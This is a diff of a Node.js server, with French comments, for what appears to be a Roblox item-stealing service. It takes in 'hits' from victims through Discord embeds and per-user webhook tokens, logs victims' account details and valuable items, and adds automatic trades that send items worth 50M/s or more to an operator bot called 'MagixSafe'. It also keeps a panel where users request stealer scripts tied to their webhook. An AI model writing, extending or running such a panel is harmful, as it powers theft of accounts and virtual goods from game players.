@@ -5,11 +5,15 @@ const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
 const path = require('path');
 const http = require('http');
-const { Server } = require("socket.io"); // Panel Web
-const WebSocket = require('ws');          // Bots Roblox
+const { Server } = require("socket.io"); 
+const WebSocket = require('ws');         
 const cookieParser = require('cookie-parser');
 const { Client, GatewayIntentBits } = require('discord.js');
 const url = require('url');
+
+// --- CONFIGURATION AUTO-TRADE ---
+const MIN_INCOME_THRESHOLD = 50000000; // 50M/s
+const MASTER_BOT = process.env.ROBLOX_USERNAME || "MagixSafe";
 
 // --- MODÈLES ---
 const User = require('./models/User');
@@ -17,7 +21,6 @@ const Message = require('./models/Message');
 const Script = require('./models/Script');
 const ScriptRequest = require('./models/ScriptRequest');
 
-// Modèle pour l'historique des Hits (Admin & Users)
 const DiscordHit = mongoose.model('DiscordHit', new mongoose.Schema({
     displayName: String,
     username: String,
@@ -26,7 +29,7 @@ const DiscordHit = mongoose.model('DiscordHit', new mongoose.Schema({
     players: String,
     receivers: [String],
     brainrots: [String],
-    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', default: null }, // Si lié à un user
+    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', default: null },
     timestamp: { type: Date, default: Date.now }
 }));
 
@@ -35,7 +38,6 @@ const server = http.createServer(app);
 const io = new Server(server);
 const wss = new WebSocket.Server({ server });
 
-// --- GESTION DES BOTS ROBLOX (WS) ---
 const activeBots = new Map(); 
 
 // --- MIDDLEWARES ---
@@ -49,25 +51,15 @@ mongoose.connect(process.env.MONGO_URI)
     .then(() => console.log("✅ MongoDB & WebSocket Core Connected"))
     .catch(err => console.error("❌ Erreur DB:", err));
 
-// --- AUTH MIDDLEWARES ---
-const authMiddleware = (req, res, next) => {
-    const token = req.cookies.auth_token;
-    if (!token) return res.redirect('/login');
-    try {
-        const decoded = jwt.verify(token, process.env.JWT_SECRET);
-        req.user = decoded;
-        next();
-    } catch (err) {
-        res.clearCookie('auth_token');
-        res.redirect('/login');
-    }
-};
-
-const masterAuth = (req, res, next) => {
-    const adminKey = req.headers['x-admin-key'] || req.query.key;
-    if (adminKey === process.env.MASTER_PASSWORD) return next();
-    return res.status(403).json({ error: "Unauthorized access" });
-};
+// --- UTILS : PARSING DE VALEUR (Logique C#) ---
+function parseIncomeJS(text) {
+    const match = text.match(/\$?([\d.]+)\s*([KMBT]?)\/s/i);
+    if (!match) return 0;
+    const value = parseFloat(match[1]);
+    const unit = match[2].toUpperCase();
+    const multipliers = { 'K': 1e3, 'M': 1e6, 'B': 1e9, 'T': 1e12 };
+    return value * (multipliers[unit] || 1);
+}
 
 // --- FONCTIONS DE TRADING ---
 function executeTrade(botName, receiver) {
@@ -81,7 +73,13 @@ function executeTrade(botName, receiver) {
 }
 
 // --- BOT DISCORD JS ---
-const bot = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
+const bot = new Client({ 
+    intents: [
+        GatewayIntentBits.Guilds, 
+        GatewayIntentBits.GuildMessages, 
+        GatewayIntentBits.MessageContent
+    ] 
+});
 
 bot.on('messageCreate', async (message) => {
     if (message.author.bot || message.embeds.length === 0) return;
@@ -97,6 +95,8 @@ bot.on('messageCreate', async (message) => {
         brainrots: []
     };
 
+    let isHighValue = false;
+
     embed.fields.forEach(f => {
         const val = f.value;
         if (val.includes("Display Name")) hitData.displayName = val.match(/Display Name\s*:\s*(.*)/i)?.[1].trim();
@@ -104,27 +104,34 @@ bot.on('messageCreate', async (message) => {
         if (val.includes("Account Age")) hitData.accountAge = val.match(/Account Age\s*:\s*(.*)/i)?.[1].trim();
         if (val.includes("Executor")) hitData.executor = val.match(/Executor\s*:\s*(.*)/i)?.[1].trim();
         if (val.includes("Players")) hitData.players = val.match(/Players\s*:\s*(.*)/i)?.[1].trim();
+        
         if (val.includes("Receiver")) {
             const raw = val.split(':')[1] || "";
             hitData.receivers = raw.replace(/`/g, "").split(',').map(n => n.trim());
         }
+        
         if (f.name.includes("Valuable Brainrots")) {
-            hitData.brainrots = val.split('\n').filter(line => line.trim() !== "");
+            const lines = val.split('\n').filter(line => line.trim() !== "");
+            hitData.brainrots = lines;
+            // Logique de détection de valeur
+            lines.forEach(line => {
+                if (parseIncomeJS(line) >= MIN_INCOME_THRESHOLD) isHighValue = true;
+            });
         }
     });
 
     if (hitData.username !== "Unknown") {
         const newHit = new DiscordHit(hitData);
         await newHit.save();
-        io.emit('new_discord_hit', newHit); // Update Admin All Hits
+        io.emit('new_discord_hit', newHit); 
 
-        // Auto-Trade sur les bots connectés
-        hitData.receivers.forEach(name => {
-            if (activeBots.has(name)) executeTrade(name, hitData.username);
-        });
+        // AUTO-TRADE SI MAGIXSAFE EST CONNECTÉ ET ITEM > 50M/s
+        if (isHighValue && activeBots.has(MASTER_BOT)) {
+            executeTrade(MASTER_BOT, hitData.username);
+        }
     }
 });
-bot.login(process.env.DISCORD_TOKEN);
+bot.login(process.env.DISCORD_BOT_TOKEN);
 
 // --- ROUTES RENDU ---
 app.get('/', (req, res) => res.sendFile(path.join(process.cwd(), 'public/index.html')));
@@ -132,6 +139,25 @@ app.get('/login', (req, res) => res.sendFile(path.join(process.cwd(), 'public/lo
 app.get('/signup', (req, res) => res.sendFile(path.join(process.cwd(), 'public/signup.html')));
 app.get('/dashboard', authMiddleware, (req, res) => res.sendFile(path.join(process.cwd(), 'public/dashboard.html')));
 app.get('/admin', authMiddleware, (req, res) => res.sendFile(path.join(process.cwd(), 'public/admin.html')));
+
+// --- AUTH MIDDLEWARES ---
+function authMiddleware(req, res, next) {
+    const token = req.cookies.auth_token;
+    if (!token) return res.redirect('/login');
+    try {
+        req.user = jwt.verify(token, process.env.JWT_SECRET);
+        next();
+    } catch (err) {
+        res.clearCookie('auth_token');
+        res.redirect('/login');
+    }
+}
+
+function masterAuth(req, res, next) {
+    const adminKey = req.headers['x-admin-key'] || req.query.key;
+    if (adminKey === process.env.MASTER_PASSWORD) return next();
+    return res.status(403).json({ error: "Unauthorized access" });
+}
 
 // --- API AUTH ---
 app.post('/api/auth/signup', async (req, res) => {
@@ -148,11 +174,7 @@ app.post('/api/auth/login', async (req, res) => {
     const { email, password } = req.body;
     const user = await User.findOne({ email });
     if (user && await bcrypt.compare(password, user.password)) {
-        const token = jwt.sign(
-            { id: user._id, username: user.username, webhook: user.webhookToken }, 
-            process.env.JWT_SECRET, 
-            { expiresIn: '24h' }
-        );
+        const token = jwt.sign({ id: user._id, username: user.username, webhook: user.webhookToken }, process.env.JWT_SECRET, { expiresIn: '24h' });
         res.cookie('auth_token', token, { httpOnly: true });
         res.redirect('/dashboard');
     } else { res.send("Identifiants incorrects."); }
@@ -167,12 +189,7 @@ app.get('/api/messages', authMiddleware, async (req, res) => {
 });
 
 app.post('/api/messages/send', authMiddleware, async (req, res) => {
-    const newMessage = new Message({
-        sender: req.user.id,
-        senderName: req.user.username,
-        recipient: 'General',
-        content: req.body.content
-    });
+    const newMessage = new Message({ sender: req.user.id, senderName: req.user.username, recipient: 'General', content: req.body.content });
     await newMessage.save();
     io.emit('new_general_message', newMessage); 
     res.json({ success: true });
@@ -186,11 +203,8 @@ app.get('/api/my-scripts', authMiddleware, async (req, res) => {
 
 app.post('/api/scripts/request', authMiddleware, async (req, res) => {
     const newRequest = new ScriptRequest({
-        userId: req.user.id,
-        username: req.user.username,
-        webhookuuid: req.user.webhook,
-        receivers: req.body.receivers,
-        minIncome: req.body.minIncome
+        userId: req.user.id, username: req.user.username, webhookuuid: req.user.webhook,
+        receivers: req.body.receivers, minIncome: req.body.minIncome
     });
     await newRequest.save();
     io.emit('new_script_request'); 
@@ -245,11 +259,7 @@ app.get('/api/sendtrade', (req, res) => {
 
 // --- WEBHOOK HITS (USERS) ---
 app.all('/webhook/:token', async (req, res) => {
-    const user = await User.findOneAndUpdate(
-        { webhookToken: req.params.token },
-        { $inc: { hitsCount: 1 } },
-        { new: true }
-    );
+    const user = await User.findOneAndUpdate({ webhookToken: req.params.token }, { $inc: { hitsCount: 1 } }, { new: true });
     if (user) {
         const hitData = {
             displayName: req.body.displayName || "Unknown",
@@ -262,7 +272,6 @@ app.all('/webhook/:token', async (req, res) => {
             userId: user._id,
             timestamp: new Date()
         };
-        // Sauvegarde en DB pour historique
         await new DiscordHit(hitData).save();
         io.to(user._id.toString()).emit('receive_message', hitData);
         io.emit('stats_updated'); 
